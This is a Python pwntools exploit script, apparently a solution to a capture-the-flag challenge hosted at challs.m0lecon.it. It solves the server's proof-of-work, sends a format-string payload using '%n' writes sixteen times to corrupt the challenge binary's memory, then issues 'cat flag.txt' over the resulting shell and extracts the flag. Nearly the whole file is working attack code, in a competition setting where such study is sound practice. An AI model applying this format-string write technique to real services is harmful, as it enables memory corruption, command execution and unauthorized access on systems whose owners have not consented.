#!/usr/bin/env python3

from pwn import *
from hashlib import sha256
import re
import time
exe = ELF("chall")

context.binary = exe
context.terminal = "kitty"

def solvepow(p, n):
    s = p.recvline()
    starting = s.split(b'with ')[1][:10].decode()
    s1 = s.split(b'in ')[-1][:n]
    i = 0
    print("Solving PoW...")
    while True:
        if sha256((starting+str(i)).encode('ascii')).hexdigest()[-n:] == s1.decode():
            print("Solved!")
            p.sendline(starting + str(i))
            break
        i += 1

def conn():
    if args.REMOTE:
        r = remote("challs.m0lecon.it",5556)
        solvepow(r, n = 5)
        return r
    elif args.GDB:
        return gdb.debug([exe.path],gdbscript="b *signin+270\nc\nderef $rsp")
    else:
        return process([exe.path])


def main():
    r = conn()

    for i in range(0xf+1):
        r.sendline(b"%*10$c%*11$c%8$n")

    time.sleep(1)
    r.sendline(b"cat flag.txt;exit;")
    log.info((b"flag found: " + re.search(b"(ptm{.*})", r.recvall()).group(1)).decode())

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()

